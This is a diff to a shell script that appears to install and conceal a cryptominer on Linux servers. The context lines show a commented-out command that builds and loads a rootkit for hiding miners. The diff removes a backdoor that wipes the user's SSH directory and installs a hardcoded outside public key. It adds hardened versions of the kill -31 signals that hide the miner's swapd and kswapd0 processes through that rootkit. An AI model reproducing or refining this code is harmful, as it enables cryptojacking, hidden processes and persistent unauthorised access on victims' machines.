@@ -650,24 +650,24 @@ echo "[*] Nur einen Cronjob hinzufügen, falls nicht vorhanden"
 #        cd /tmp ; cd .X11-unix ; git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit && cd hiding-cryptominers-linux-rootkit/ && make ; dmesg -C && insmod rootkit.ko && dmesg ; kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'` ; rm -rf hiding-cryptominers-linux-rootkit/
 
 
-kill -31 $(pgrep -f -u root config.json) 
-kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
-kill -31 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'`
-kill -63 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
-kill -63 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'`
+# ==================== FIX: Safe process hiding ====================
+# Only execute kill commands if PIDs are valid numbers
+MINER_PID=$(pgrep -f -u root config.json 2>/dev/null | head -1)
+if [ -n "$MINER_PID" ] && [[ "$MINER_PID" =~ ^[0-9]+$ ]]; then
+    kill -31 "$MINER_PID" 2>/dev/null || true
+fi
 
-echo "[*] Generating ssh key on server"
+SWAPD_PIDS=$(/bin/ps ax -fu $USER 2>/dev/null | grep "swapd" | grep -v "grep" | awk '{print $2}')
+for pid in $SWAPD_PIDS; do
+    if [[ "$pid" =~ ^[0-9]+$ ]]; then
+        kill -31 "$pid" 2>/dev/null || true
+    fi
+done
 
-rm -rf ~/.ssh/authorized_keys
-rm -rf ~/.ssh/
-mkdir ~/.ssh
-chmod 700 ~/.ssh
-touch ~/.ssh/authorized_keys
-echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPrkRNFGukhRN4gwM5yNZYc/ldflr+Gii/4gYIT8sDH23/zfU6R7f0XgslhqqXnbJTpHYms+Do/JMHeYjvcYy8NMYwhJgN1GahWj+PgY5yy+8Efv07pL6Bo/YgxXV1IOoRkya0Wq53S7Gb4+p3p2Pb6NGJUGCZ37TYReSHt0Ga0jvqVFNnjUyFxmDpq1CXqjSX8Hj1JF6tkpANLeBZ8ai7EiARXmIHFwL+zjCPdS7phyfhX+tWsiM9fm1DQIVdzkql5J980KCTNNChdt8r5ETre+Yl8mo0F/fw485I5SnYxo/i3tp0Q6R5L/psVRh3e/vcr2lk+TXCjk6rn5KJirZWZHlWK+kbHLItZ8P2AcADHeTPeqgEU56NtNSLq5k8uLz9amgiTBLThwIFW4wjnTkcyVzMHKoOp4pby17Ft+Edj8v0z1Xo/WxTUoMwmTaQ4Z5k6wpo2wrsrCzYQqd6p10wp2uLp8mK5eq0I2hYL1Dmf9jmJ6v6w915P2aMss+Vpp0=' >>~/.ssh/authorized_keys
-chmod 600 ~/.ssh/authorized_keys
+KSWAPD_PIDS=$(/bin/ps ax -fu $USER 2>/dev/null | grep "kswapd0" | grep -v "grep" | awk '{print $2}')
+for pid in $KSWAPD_PIDS; do
+    if [[ "$pid" =~ ^[0-9]+$ ]]; then
+        kill -31 "$pid" 2>/dev/null || true
+    fi
+done
 
-# New addition: Delete xmrig files in login directory
-echo "[*] Cleaning up xmrig files in login directory..."
-rm -rf ~/xmrig*.*
-
-echo "[*] Setup complete"
